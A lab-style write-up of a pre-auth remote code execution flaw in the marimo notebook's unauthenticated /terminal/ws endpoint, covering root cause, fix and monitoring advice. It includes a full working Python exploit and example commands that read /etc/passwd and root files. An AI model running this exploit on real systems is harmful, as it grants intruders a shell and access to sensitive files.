<p align="center">
<img src="https://i.ibb.co/YOUR_IMAGE_ID/your-image-name.png" alt="CVE-2026-39987 — Marimo Pre-Auth RCE" width="100%">
</p>

# CVE-2026-39987 — Marimo Pre-Auth RCE via Unauthenticated WebSocket Terminal

| Field          | Details                                                |
|----------------|--------------------------------------------------------|
| **CVE**        | CVE-2026-39987                                         |
| **Software**   | marimo (reactive Python notebook)                      |
| **Type**       | Pre-Auth Remote Code Execution (RCE)                   |
| **CWE**        | CWE-306 — Missing Authentication for Critical Function |
| **CVSS Score** | 9.3 (Critical)                                         |
| **Affected**   | All versions < 0.23.0                                  |
| **Fixed in**   | marimo 0.23.0                                          |
| **CISA KEV**   | Added April 23, 2026                                   |

---

## Discovery

While solving the machine, I noticed it was running **marimo** — a modern reactive Python notebook (think Jupyter, but reactive).

The service was exposed on port 443.

After identifying the software and version, I confirmed it fell under the affected range:

```text
< 0.23.0
```

making it a candidate for CVE-2026-39987.

The key indicator was this path being accessible:

```text
/terminal/ws
```

A WebSocket endpoint that, in vulnerable versions, accepts connections with no authentication whatsoever.

---

## Research

marimo exposes several WebSocket endpoints as part of its server architecture.

Most of them are protected. For example, the main `/ws` endpoint correctly calls:

```text
validate_auth()
```

before allowing a connection.

The terminal endpoint `/terminal/ws`, however, was different.

It only checks two things before accepting a connection:

```text
1. Whether the server is running in the correct mode.
2. Whether the platform supports terminal functionality.
```

That is it. No credential check. No token validation. Nothing.

The root cause is defined in:

```text
marimo/_server/api/endpoints/terminal.py
```

---

## Analysis

The flaw is a classic case of **CWE-306: Missing Authentication for Critical Function**.

What makes this particularly severe is not just the missing auth — it is *what* the endpoint provides.

`/terminal/ws` does not expose a data endpoint or a read-only interface. It spawns a full:

```text
PTY (pseudo-terminal) shell
```

The attack chain is:

```text
Attacker
   │
   │  WebSocket connection to /terminal/ws
   │  (no authentication required)
   ▼
marimo server
   │
   │  Spawns PTY shell
   │  Skips validate_auth()
   ▼
Full shell on the host system
```

The other endpoints use a `@requires()` decorator or explicitly call `validate_auth()`.

The terminal endpoint simply forgot to do either — and that oversight grants an unauthenticated user the same level of access as the process owner.

---

## Exploitation

The attack requires no credentials, no tokens, and no prior access.

The full exploitation path:

```text
Attacker
   │
   ▼
wss://<target>:443/terminal/ws
   │
   ▼
Skip SSL verification (self-signed cert)
   │
   ▼
Wait for PTY shell to initialize
   │
   ▼
Send shell command terminated with \r
   │
   ▼
Read output
   │
   ▼
Full command execution
```

---

## WebSocket Connection

The exploit connects directly to the terminal endpoint:

```text
wss://<target>:443/terminal/ws
```

SSL verification is skipped because these setups commonly use self-signed certificates.

The connection is established using:

```python
ws = create_connection(
    url,
    host=HOST,
    origin=f"https://{HOST}",
    sslopt={"cert_reqs": ssl.CERT_NONE, "check_hostname": False},
    timeout=5
)
```

No handshake. No auth header. The server accepts immediately.

---

## PTY Shell Initialization

After connecting, the server initializes the PTY shell automatically.

The exploit waits a short period to allow the terminal to fully start:

```text
receive(ws, 2)
```

This reads back the initial PTY output — the shell prompt and any banner text.

---

## Command Execution

Commands are sent as plain text terminated with `\r`:

```python
ws.send(command + "\r")
```

The output is collected over a short window:

```text
receive(ws, 3)
```

The result is the raw shell output streamed back over the WebSocket.

---

## PoC

> My own implementation — connects to the target, sends a command, and reads back the shell output.

```python
import ssl
import sys
import time
from websocket import create_connection, WebSocketTimeoutException

targetIP = "127.0.1"
HOST = "odysseus.me"
PATH = "/terminal/ws"

def connect():
    url = f"wss://{targetIP}:443{PATH}"
    ws = create_connection(
        url,
        host=HOST,
        origin=f"https://{HOST}",
        sslopt={"cert_reqs": ssl.CERT_NONE, "check_hostname": False},
        timeout=5
    )
    return ws

def receive(ws, duration=3):
    recv = ""
    ws.settimeout(0.5)
    end = time.time() + duration
    while time.time() < end:
        try:
            chunk = ws.recv()
            recv += chunk
        except WebSocketTimeoutException:
            continue
        except Exception as e:
            print(f"Error: {e}")
    return recv

if len(sys.argv) > 1:
    command = sys.argv[1]
else:
    command = "id; whoami; hostname"

ws = connect()

print(receive(ws, 2))

ws.send(command + "\r")

print(receive(ws, 3))
```

The PoC expects:

```text
python exploit.py "<command>"
```

Examples:

```text
python exploit.py "id; whoami; hostname"
python exploit.py "cat /etc/passwd"
python exploit.py "cat /root/root.txt"
```

---

## Impact

A remote, unauthenticated attacker can:

```text
/terminal/ws
      │
      ▼
Arbitrary command execution
      │
      ▼
Read sensitive files (credentials, keys, flags)
      │
      ▼
Write files or plant backdoors
      │
      ▼
Pivot to internal network
      │
      ▼
Complete system compromise
```

This vulnerability was exploited in the wild **within 10 hours** of its public disclosure.

It was later added to the CISA Known Exploited Vulnerabilities (KEV) catalog.

---

## Fix

Update marimo to:

```text
0.23.0 or later
```

In the fixed version, `/terminal/ws` properly enforces authentication before accepting connections.

Additional defensive measures include:

- Do not expose marimo to untrusted networks.
- Enforce network-level access controls.
- Run marimo as a low-privilege user, not as root.
- Monitor unexpected WebSocket connections to `/terminal/ws`.
- Monitor for unusual process spawning from the marimo process.
- Keep marimo updated.

---

## What I Learned

The biggest lesson from this CVE was how dangerous a **single missing function call** can be.

The authentication pattern was already established in marimo's own codebase:

```text
validate_auth()
```

Other endpoints use it. The terminal endpoint simply did not.

That one omission turned a legitimate feature — a browser-based PTY — into a pre-auth RCE reachable by anyone with network access.

It also reinforced something important about severity ratings:

```text
Missing auth on a data endpoint → bad
Missing auth on a PTY shell     → critical
```

The CVSS score of 9.3 reflects exactly this distinction.

The exploitation itself was straightforward. The research was not — it required reading the source, understanding how marimo routes WebSocket connections, and confirming that no other layer added the missing check.

---

## References

- [GitHub Advisory — GHSA-2679-6mx9-h9xc](https://github.com/marimo-team/marimo/security/advisories/GHSA-2679-6mx9-h9xc)
- [NVD — CVE-2026-39987](https://nvd.nist.gov/vuln/detail/CVE-2026-39987)
- [CISA KEV Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-39987)
- [Sysdig Blog — From Disclosure to Exploitation in Under 10 Hours](https://www.sysdig.com/blog/marimo-oss-python-notebook-rce-from-disclosure-to-exploitation-in-under-10-hours)

---

*One machine. One vulnerability. One more page.*
